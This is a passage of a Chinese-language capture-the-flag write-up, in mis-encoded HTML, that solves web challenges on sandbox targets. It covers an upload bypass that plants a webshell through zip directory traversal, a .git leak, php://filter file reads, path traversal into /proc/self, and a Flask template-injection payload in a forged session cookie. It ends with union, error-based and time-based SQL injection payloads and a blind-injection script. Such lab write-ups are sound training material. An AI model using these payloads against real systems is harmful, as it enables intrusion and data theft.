class="token string">'/'</span><span class="token punctuation">.</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">check_dir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">'ä¸Šä¼ æˆåŠŸ!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">'ä»…å…è®¸ä¸Šä¼ zipã€jpgã€gifã€pngæ–‡ä»¶!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="æ€è·¯ï¼š"><a href="#æ€è·¯ï¼š" class="headerlink" title="æ€è·¯ï¼š"></a>æ€è·¯ï¼š</h3><h4 id="ç¬¬ä¸€æ­¥çš„ç»•è¿‡ï¼š"><a href="#ç¬¬ä¸€æ­¥çš„ç»•è¿‡ï¼š" class="headerlink" title="ç¬¬ä¸€æ­¥çš„ç»•è¿‡ï¼š"></a>ç¬¬ä¸€æ­¥çš„ç»•è¿‡ï¼š</h4><p>åˆ©ç”¨apacheçš„æ–‡ä»¶è§£ææ¼æ´æ¥å®ç°phpæ–‡ä»¶èƒ½å¤Ÿæ‰§è¡Œï¼š</p><p>éœ€è¦å°†å¸¦æœ‰æœ¨é©¬çš„phpæ–‡ä»¶åå­—æ”¹ä¸º1.php.111ï¼Œè®©111æ— æ³•è¢«æ˜¯è¢«ç„¶åç»§ç»­å‘å·¦æ¥è¯†åˆ«phpæ¥ç¡®å®šæ–‡ä»¶ç±»å‹</p><h4 id="ç¬¬äºŒæ­¥çš„ç»•è¿‡ï¼š"><a href="#ç¬¬äºŒæ­¥çš„ç»•è¿‡ï¼š" class="headerlink" title="ç¬¬äºŒæ­¥çš„ç»•è¿‡ï¼š"></a>ç¬¬äºŒæ­¥çš„ç»•è¿‡ï¼š</h4><p>åœ¨æºä»£ç ä¸­ç”±å®šä¹‰check_dirå‡½æ•°æ–¹æ³•æ¥æ£€æŸ¥ç›®å½•çš„æƒ…å†µï¼Œå¦‚æœä¸æ˜¯ä¸€ä¸ªç›®å½•çš„è¯ï¼Œä¼šåˆ é™¤è¿™ä¸ªéæ³•æ–‡ä»¶ï¼Œå¹¶æç¤ºè§£å‹å¤±è´¥ï¼Œæ‰€ä»¥è¦æ„é€ çš„ç‰¹æ®Šå‹ç¼©åŒ…ï¼ˆè§£å‹åˆ°ä¸€åŠåœ¨çªå‡ºï¼‰çš„æ–¹æ³•ä¸å¯å–ï¼Œæ‰€ä»¥åˆ©ç”¨pclzipçš„å·²çŸ¥æ¼æ´ï¼šç›®å½•ç©¿è¶Šé—®é¢˜ã€‚å¦‚æœè§£å‹å‡ºçš„æ–‡ä»¶èƒ½éƒ½é€ƒæ‰check_dirè¿™ä¸€ç¯èŠ‚é‚£ä¹ˆè§£å‹å‡ºçš„é—®ä»·å°±ä¸ä¼šè¢«åˆ é™¤ã€‚</p><p>æºä»£ç å¯ä»¥çŸ¥é“æ‰€ä¸Šä¼ çš„æ–‡ä»¶åœ¨upload/md5/ç›®å½•ä¸‹çš„ï¼Œæ‰€ä»¥è¦ç©¿è¶Šä¸¤å±‚ï¼š../../</p><h3 id="è§£é¢˜ï¼š"><a href="#è§£é¢˜ï¼š" class="headerlink" title="è§£é¢˜ï¼š"></a>è§£é¢˜ï¼š</h3><p>1.ç”Ÿæˆå¸¦æœ‰æœ¨é©¬çš„åå­—ä¸ºxxxxxxx.php.xxxçš„æ–‡ä»¶ï¼Œç„¶åç”Ÿæˆå‹ç¼©åŒ…</p><p>2.010editeræ‰“å¼€zipæ–‡ä»¶ï¼š<img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B404%E6%9C%8830%E6%97%A51922_2.png" alt></p><p>ä¿®æ”¹è¿™ä¸ªåœ°æ–¹ï¼Œè¿™é‡Œä¹Ÿå°±ä½“ç°å‡ºäº†åå­—ä¸ºä»€ä¹ˆä¸€å¼€å§‹è®¾ç½®ä¸º7ä¸ªxäº†</p><p>ç„¶åæŠŠè¿™ä¸ªzipä¸Šä¼ ï¼Œç„¶åè®¿é—®x.php.xxxå°±èƒ½å¾—åˆ°flag</p><h2 id="ç²—å¿ƒçš„å°æ"><a href="#ç²—å¿ƒçš„å°æ" class="headerlink" title="ç²—å¿ƒçš„å°æ"></a>ç²—å¿ƒçš„å°æ</h2><h3 id="è€ƒç‚¹ï¼š-1"><a href="#è€ƒç‚¹ï¼š-1" class="headerlink" title="è€ƒç‚¹ï¼š"></a>è€ƒç‚¹ï¼š</h3><p>gitæ–‡ä»¶æ³„éœ²</p><h3 id="æ€è·¯ï¼š-1"><a href="#æ€è·¯ï¼š-1" class="headerlink" title="æ€è·¯ï¼š"></a>æ€è·¯ï¼š</h3><p>githackå·¥å…·åˆ©ç”¨</p><h3 id="è§£é¢˜ï¼š-1"><a href="#è§£é¢˜ï¼š-1" class="headerlink" title="è§£é¢˜ï¼š"></a>è§£é¢˜ï¼š</h3><pre><code>git clone https://github.com/BugScanTeam/GitHackcd GitHackpython GitHack.py http://challenge-df81f549db86830c.sandbox.ctfhub.com:10080/.git</code></pre><p>ä¼šå¾—åˆ°indedx.htmlåŒæ—¶flagä¹Ÿè¢«éƒ¨ç½²åˆ°äº†å‰ç«¯</p><h2 id="å¸¸è§çš„æ”¶é›†"><a href="#å¸¸è§çš„æ”¶é›†" class="headerlink" title="å¸¸è§çš„æ”¶é›†"></a>å¸¸è§çš„æ”¶é›†</h2><h3 id="è€ƒç‚¹ï¼š-2"><a href="#è€ƒç‚¹ï¼š-2" class="headerlink" title="è€ƒç‚¹ï¼š"></a>è€ƒç‚¹ï¼š</h3><p>æ•æ„Ÿæ–‡ä»¶</p><h3 id="æ€è·¯ï¼š-2"><a href="#æ€è·¯ï¼š-2" class="headerlink" title="æ€è·¯ï¼š"></a>æ€è·¯ï¼š</h3><p>å¾¡å‰‘æˆ–è€…burpé…åˆå­—å…¸åŠè‡ªåŠ¨åŒ–æœç´¢</p><h3 id="è§£é¢˜ï¼š-2"><a href="#è§£é¢˜ï¼š-2" class="headerlink" title="è§£é¢˜ï¼š"></a>è§£é¢˜ï¼š</h3><p>å®é™…æš´éœ²çš„æ•æ„Ÿä¿¡æ¯ï¼š</p><p>robots.txt </p><p>index.php~ </p><p>.index.php.swp</p><p>ç„¶åæ‹¼æ¥è¿™ä¸‰éƒ¨åˆ†çš„flag</p><h2 id="afr-1"><a href="#afr-1" class="headerlink" title="afr-1"></a>afr-1</h2><h3 id="è€ƒç‚¹ï¼š-3"><a href="#è€ƒç‚¹ï¼š-3" class="headerlink" title="è€ƒç‚¹ï¼š"></a>è€ƒç‚¹ï¼š</h3><p><a href="https://www.cnblogs.com/zzjdbk/p/13030717.html" target="_blank" rel="noopener">phpä¸­ä¼ªåè®®æ€»ç»“</a>ï¼š</p><p>php://filterä¼ªåè®®çš„åˆ©ç”¨</p><p>æ¡ä»¶ï¼š</p><p>ä¸éœ€è¦å¼€å¯allow_url_fopenï¼Œä»…php://inputã€ php://stdinã€ php://memory å’Œ php://temp éœ€è¦å¼€å¯allow_url_includeã€‚</p><h3 id="æ€è·¯ï¼š-3"><a href="#æ€è·¯ï¼š-3" class="headerlink" title="æ€è·¯ï¼š"></a>æ€è·¯ï¼š</h3><p>ç›´æ¥æ„é€ payload</p><h3 id="è§£é¢˜ï¼š-3"><a href="#è§£é¢˜ï¼š-3" class="headerlink" title="è§£é¢˜ï¼š"></a>è§£é¢˜ï¼š</h3><p>payloadï¼š</p><pre><code>?p=php://filter/read=convert.base64-encode/resource=flag</code></pre><p>å¾—ï¼š</p><pre><code>&lt;?phpdie(&#39;no no no&#39;);//n1book{afr_1_solved}</code></pre><h2 id="afr-2"><a href="#afr-2" class="headerlink" title="afr-2"></a>afr-2</h2><h3 id="è€ƒç‚¹ï¼š-4"><a href="#è€ƒç‚¹ï¼š-4" class="headerlink" title="è€ƒç‚¹ï¼š"></a>è€ƒç‚¹ï¼š</h3><p>ç›®å½•ç©¿è¶Š</p><h3 id="è§£é¢˜ï¼š-4"><a href="#è§£é¢˜ï¼š-4" class="headerlink" title="è§£é¢˜ï¼š"></a>è§£é¢˜ï¼š</h3><p>æ‰“å¼€ä¸€çœ‹ï¼Œå‘ç°ç²¾ç¥å°ä¼™ï¼Œf12å‘ç°æ¥è‡ªimg</p><p><a href="http://challenge-63b251d2430d82a1.sandbox.ctfhub.com:10080/img../" target="_blank" rel="noopener">http://challenge-63b251d2430d82a1.sandbox.ctfhub.com:10080/img../</a></p><p>æ‰“å¼€ç›®å½•ä¸‹é¢çš„flagä¸‹è½½å¾—</p><p>n1book{afr_2_solved}</p><h2 id="afr-3"><a href="#afr-3" class="headerlink" title="afr-3"></a>afr-3</h2><h3 id="è€ƒç‚¹ï¼š-5"><a href="#è€ƒç‚¹ï¼š-5" class="headerlink" title="è€ƒç‚¹ï¼š"></a>è€ƒç‚¹ï¼š</h3><p>1.ç›®å½•ç©¿è¶Š</p><p>2.å¯¹linux/procç›®å½•çš„è¾ƒä¸ºæ·±å±‚æ¬¡çš„ç†è§£ï¼š</p><p> /procç›®å½•é€šå¸¸å­˜å‚¨ç€è¿›ç¨‹åŠ¨æ€è¿è¡Œçš„å„ç§ä¿¡æ¯ï¼Œæœ¬è´¨ä¸Šæ˜¯ä¸€ç§è™šæ‹Ÿç›®å½•ã€‚</p><p>å¯¹åº”ç›®å½•ä¸‹çš„cmdlineå¯è¯»å‡ºæ¯”è¾ƒæ•æ„Ÿçš„ä¿¡æ¯ï¼Œ</p><p>Linuxç³»ç»Ÿä¸Šçš„/procç›®å½•æ˜¯ä¸€ç§æ–‡ä»¶ç³»ç»Ÿï¼Œå³procæ–‡ä»¶ç³»ç»Ÿã€‚ä¸å…¶å®ƒå¸¸è§çš„æ–‡ä»¶ç³»ç»Ÿä¸åŒçš„æ˜¯ï¼Œ/procæ˜¯ä¸€ç§ä¼ªæ–‡ä»¶ç³»ç»Ÿï¼ˆä¹Ÿå³è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿï¼‰ï¼Œå­˜å‚¨çš„æ˜¯å½“å‰å†…æ ¸è¿è¡ŒçŠ¶æ€çš„ä¸€ç³»åˆ—ç‰¹æ®Šæ–‡ä»¶ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡è¿™äº›æ–‡ä»¶æŸ¥çœ‹æœ‰å…³ç³»ç»Ÿç¡¬ä»¶åŠå½“å‰æ­£åœ¨è¿è¡Œè¿›ç¨‹çš„ä¿¡æ¯ï¼Œç”šè‡³å¯ä»¥é€šè¿‡æ›´æ”¹å…¶ä¸­æŸäº›æ–‡ä»¶æ¥æ”¹å˜å†…æ ¸çš„è¿è¡ŒçŠ¶æ€ã€‚<br>/proc/[pid],å½“æŸ¥çœ‹å½“å‰è¿›ç¨‹çš„æ—¶å€™å¯ä»¥ç”¨/proc/selfä»£æ›¿<br>cmdline â€” å¯åŠ¨å½“å‰è¿›ç¨‹çš„å®Œæ•´å‘½ä»¤ï¼Œä½†åƒµå°¸è¿›ç¨‹ç›®å½•ä¸­çš„æ­¤æ–‡ä»¶ä¸åŒ…å«ä»»ä½•ä¿¡æ¯<br>cwd â€” æŒ‡å‘å½“å‰è¿›ç¨‹è¿è¡Œç›®å½•çš„ä¸€ä¸ªç¬¦å·é“¾æ¥<br>environ â€” å½“å‰è¿›ç¨‹çš„ç¯å¢ƒå˜é‡åˆ—è¡¨ï¼Œå½¼æ­¤é—´ç”¨ç©ºå­—ç¬¦ï¼ˆNULLï¼‰éš”å¼€ï¼›å˜é‡ç”¨å¤§å†™å­—æ¯è¡¨ç¤ºï¼Œå…¶å€¼ç”¨å°å†™å­—æ¯è¡¨ç¤º</p><pre><code>/proc/sched_debug # æä¾›cpuä¸Šæ­£åœ¨è¿è¡Œçš„è¿›ç¨‹ä¿¡æ¯ï¼Œå¯ä»¥è·å¾—è¿›ç¨‹çš„pidå·ï¼Œå¯ä»¥é…åˆåé¢éœ€è¦pidçš„åˆ©ç”¨/proc/mounts # æŒ‚è½½çš„æ–‡ä»¶ç³»ç»Ÿåˆ—è¡¨/proc/net/arp # arpè¡¨ï¼Œå¯ä»¥è·å¾—å†…ç½‘å…¶ä»–æœºå™¨çš„åœ°å€/proc/net/route # è·¯ç”±è¡¨ä¿¡æ¯/proc/net/tcp and /proc/net/udp # æ´»åŠ¨è¿æ¥çš„ä¿¡æ¯/proc/net/fib_trie # è·¯ç”±ç¼“å­˜/proc/version  # å†…æ ¸ç‰ˆæœ¬/proc/[PID]/cmdline # å¯èƒ½åŒ…å«æœ‰ç”¨çš„è·¯å¾„ä¿¡æ¯/proc/[PID]/environ #  ç¨‹åºè¿è¡Œçš„ç¯å¢ƒå˜é‡ä¿¡æ¯ï¼Œå¯ä»¥ç”¨æ¥åŒ…å«getshell/proc/[PID]/cwd     # å½“å‰è¿›ç¨‹çš„å·¥ä½œç›®å½•/proc/[PID]/fd/[#] # è®¿é—®file descriptorsï¼ŒæŸå†™æƒ…å†µå¯ä»¥è¯»å–åˆ°è¿›ç¨‹æ­£åœ¨ä½¿ç”¨çš„æ–‡ä»¶ï¼Œæ¯”å¦‚access.log</code></pre><p>3.flasksessionä¼ªé€ </p><h3 id="æ€è·¯ï¼š-4"><a href="#æ€è·¯ï¼š-4" class="headerlink" title="æ€è·¯ï¼š"></a>æ€è·¯ï¼š</h3><p>åˆ©ç”¨ç›®å½•ç©¿è¶Šå®ç°è¯»å–/proc/self/cmdlineï¼Œè¯»å–flag.pyï¼Œè¯»å–key.py</p><p>åˆ©ç”¨è„šæœ¬é…åˆkeyä¼ªé€ session</p><h3 id="è§£é¢˜ï¼š-5"><a href="#è§£é¢˜ï¼š-5" class="headerlink" title="è§£é¢˜ï¼š"></a>è§£é¢˜ï¼š</h3><p>1.</p><pre><code>?name=../../../../proc/self/cmdline</code></pre><p>å¾—pythonserver.py</p><p>2.</p><pre><code>?name=../../../../proc/self/cwd/server.py</code></pre><p>å¾—</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">import</span> os<span class="token keyword">from</span> flask <span class="token keyword">import</span> <span class="token punctuation">(</span>Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> request<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> session<span class="token punctuation">,</span> render_template_string<span class="token punctuation">)</span><span class="token keyword">from</span> flask_session <span class="token keyword">import</span> Sessionapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>execfile<span class="token punctuation">(</span><span class="token string">'flag.py'</span><span class="token punctuation">)</span>execfile<span class="token punctuation">(</span><span class="token string">'key.py'</span><span class="token punctuation">)</span>FLAG <span class="token operator">=</span> flagapp<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> key @app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">"/n1page"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">n1page</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">!=</span> <span class="token string">"POST"</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">"index"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    n1code <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"n1code"</span><span class="token punctuation">)</span> <span class="token operator">or</span> None    <span class="token keyword">if</span> n1code <span class="token keyword">is</span> <span class="token operator">not</span> None<span class="token punctuation">:</span>         n1code <span class="token operator">=</span> n1code<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"_"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"{"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"}"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"n1code"</span> <span class="token operator">not</span> <span class="token keyword">in</span> session <span class="token operator">or</span> session<span class="token punctuation">[</span><span class="token string">'n1code'</span><span class="token punctuation">]</span> <span class="token keyword">is</span> None<span class="token punctuation">:</span> session<span class="token punctuation">[</span><span class="token string">'n1code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> n1code    template <span class="token operator">=</span> None    <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'n1code'</span><span class="token punctuation">]</span> <span class="token keyword">is</span> <span class="token operator">not</span> None<span class="token punctuation">:</span>         template <span class="token operator">=</span>         <span class="token triple-quoted-string string">'''        &lt;h1>N1 Page&lt;/h1> &lt;div class="row> &lt;div class="col-md-6 col-md-offset-3 center"> Hello : %s, why you don't look at our &lt;a href='/article?name=article'>article&lt;/a>? &lt;/div> &lt;/div>         '''</span> <span class="token operator">%</span>        session<span class="token punctuation">[</span><span class="token string">'n1code'</span><span class="token punctuation">]</span>        session<span class="token punctuation">[</span><span class="token string">'n1code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> None        <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>template<span class="token punctuation">)</span> @app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"main.html"</span><span class="token punctuation">)</span> @app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/article'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">article</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     error <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> <span class="token string">'name'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>args<span class="token punctuation">:</span>    page <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">)</span> <span class="token keyword">else</span><span class="token punctuation">:</span>    page <span class="token operator">=</span> <span class="token string">'article'</span><span class="token keyword">if</span> page<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">:</span> page <span class="token operator">=</span> <span class="token string">'notallowed.txt'</span><span class="token keyword">try</span><span class="token punctuation">:</span>    template <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'/home/nu11111111l/articles/{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>page<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>    template <span class="token operator">=</span> e    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'article.html'</span><span class="token punctuation">,</span> template<span class="token operator">=</span>template<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>     app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://xz.aliyun.com/t/3679" target="_blank" rel="noopener">flaskä¹‹sstiæ¨¡ç‰ˆæ³¨å…¥ä»é›¶åˆ°å…¥é—¨</a></p><p>ç›®å‰çš„sessionç»è¿‡è§£å¯†æ˜¯ï¼š{â€˜n1codeâ€™: None}</p><p>é’ˆå¯¹æºä»£ç è¿›è¡Œæ³¨å…¥ï¼š</p><pre><code>{&#39;n1code&#39;: &#39;{{\'\'.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[\'os\'].popen(\'cat flag.py\').read()}}&#39;}</code></pre><p>è¿™ä¸ªåœ°æ–¹ä¸ºä»€ä¹ˆæ³¨å…¥è¿™æ ·çš„è¯­å¥æˆ‘æ²¡å¼„æ˜ç™½</p><p>3.åˆ©ç”¨è„šæœ¬é…åˆkey.pyæ„é€ session</p><p>è·å–key.py</p><pre><code>?name=../../../../proc/self/cwd/key.py</code></pre><p>key = â€˜Drmhze6EPcv0fN_81Bj-nAâ€™</p><pre><code> python hctf_admin_2.py encode -s &quot;Drmhze6EPcv0fN_81Bj-nA&quot; -t &quot;{&#39;n1code&#39;: &#39;{{\'\'.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[\'os\'].popen(\'cat flag.py\').read()}}&#39;}&quot;å¾—åˆ°ï¼š.eJwdikEKgCAQAL8SXlYvQl2CviKxbGoRmCtZhxD_nnUbZqaI2Ft2XkyiFACNaAPljNjoOBnRDHPDfC-_961IZcb-k3vcr3_cAi8UWjLAGWadOPkowdLVrYE2nR5Q-vTkpKpV1BcrHygP.YIwlRQ.1bHGytWxAX498Sfx6r9JQtrwrSU</code></pre><p>å°†å…¶ä¿å­˜åˆ°cookieä¸­çš„sessionä¸­å³å¯ï¼Œæ³¨æ„å‰é¢çš„ç‚¹</p><h2 id="SQLæ³¨å…¥-1"><a href="#SQLæ³¨å…¥-1" class="headerlink" title="SQLæ³¨å…¥-1"></a>SQLæ³¨å…¥-1</h2><pre><code>&amp;tips=1</code></pre><p>å¾—åˆ°æç¤ºï¼šselect * from notes where id =â€™3â€™</p><p>payloadï¼š</p><pre><code>1&#39; order by 4 --+1&#39; order by 3 --+-1&#39; union select 1,2,3 --+-1&#39; union select 1,database(),3 --+-1&#39; union select 1,concat(table_name),3 from information_schema.tables where table_schema=&#39;note&#39; --+-1&#39; union select 1,concat(column_name),3 from information_schema.columns where table_name=&#39;fl4g&#39; --+-1&#39; union select 1,concat(fllllag),3 from note.fl4g --+</code></pre><p>å¾—åˆ°flagï¼š<strong>n1book{union_select_is_so_cool}</strong></p><h2 id="SQLæ³¨å…¥-2"><a href="#SQLæ³¨å…¥-2" class="headerlink" title="SQLæ³¨å…¥-2"></a>SQLæ³¨å…¥-2</h2><h3 id="è€ƒç‚¹ï¼š-6"><a href="#è€ƒç‚¹ï¼š-6" class="headerlink" title="è€ƒç‚¹ï¼š"></a>è€ƒç‚¹ï¼š</h3><p>æŠ¥é”™æ³¨å…¥</p><h3 id="è§£é¢˜ï¼š-6"><a href="#è§£é¢˜ï¼š-6" class="headerlink" title="è§£é¢˜ï¼š"></a>è§£é¢˜ï¼š</h3><h4 id="åŸºäºæŠ¥é”™ï¼š"><a href="#åŸºäºæŠ¥é”™ï¼š" class="headerlink" title="åŸºäºæŠ¥é”™ï¼š"></a>åŸºäºæŠ¥é”™ï¼š</h4><pre><code>name=1&#39;and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+&amp;pass=xxxxname=1&#39;and updatexml(1,concat(0x7e,(seLEct group_concat(table_name) from information_schema.tables where table_schema=&#39;note&#39;),0x7e),1)--+&amp;pass=xxxxname=1&#39;and updatexml(1,concat(0x7e,(seLEct group_concat(column_name) from information_schema.columns where table_name=&#39;fl4g&#39;),0x7e),1)--+&amp;pass=xxxxname=1&#39;and updatexml(1,concat(0x7e,(seLEct group_concat(flag) from note.fl4g),0x7e),1)--+&amp;pass=xxxx</code></pre><p>å¾—ï¼šn1book{login_sqli_is_nice}</p><h4 id="åŸºäºæ—¶é—´ï¼š"><a href="#åŸºäºæ—¶é—´ï¼š" class="headerlink" title="åŸºäºæ—¶é—´ï¼š"></a>åŸºäºæ—¶é—´ï¼š</h4><p>å¤§ä½“éª¨æ¶ï¼š</p><pre><code>name=1&#39;+or+if(substr(database(),1,1)=&#39;n&#39;,sleep(1),1)#&amp;pass=xxx</code></pre><p>è„šæœ¬ï¼š</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> timel <span class="token operator">=</span> <span class="token string">'qwertyuiopasdfghjklzxcvbnm-=+_,.1234567890{}'</span>url <span class="token operator">=</span> <span class="token string">'http://challenge-92892f03ae72aafc.sandbox.ctfhub.com:10080/login.php'</span><span class="token comment" spellcheck="true"># sql = "1' or if(substr(database(),%d,1)='%s',sleep(2),1)#"</span><span class="token comment" spellcheck="true"># sql = "1' or if(substr((seLEct group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1)='%s',sleep(2),1)#"</span><span class="token comment" spellcheck="true"># sql = "1' or if(substr((seLEct group_concat(column_name) from information_schema.columns where table_name='fl4g'),%d,1)='%s',sleep(2),1)#"</span>sql <span class="token operator">=</span> "<span class="token number">1</span><span class="token string">' or if(substr((seLEct flag from fl4g),%d,1)='</span><span class="token operator">%</span>s'<span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#"</span>flag <span class="token operator">=</span> <span class="token string">''</span>length<span class="token operator">=</span><span class="token number">4</span><span class="token keyword">for</span> num <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>length<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> l<span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">'name'</span> <span class="token punctuation">:</span> sql <span class="token operator">%</span><span class="token punctuation">(</span>num<span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token string">'pass'</span> <span class="token punctuation">:</span> <span class="token string">'asdasd'</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true"># print(data)</span>        t <span class="token operator">=</span> int<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url <span class="token operator">=</span> url <span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> int<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> t <span class="token operator">></span> <span class="token number">2</span> <span class="token punctuation">:</span>            flag <span class="token operator">+=</span> i            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"flag:"</span> <span class="token punctuation">,</span> flag<span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="æ­»äº¡pingå‘½ä»¤"><a href="#æ­»äº¡pingå‘½ä»¤" class="headerlink" title="æ­»äº¡pingå‘½ä»¤"></a>æ­»äº¡pingå‘½ä»¤</h2><h3 id="è€ƒç‚¹ï¼š-7"><a href="#è€ƒç‚¹ï¼š-7" 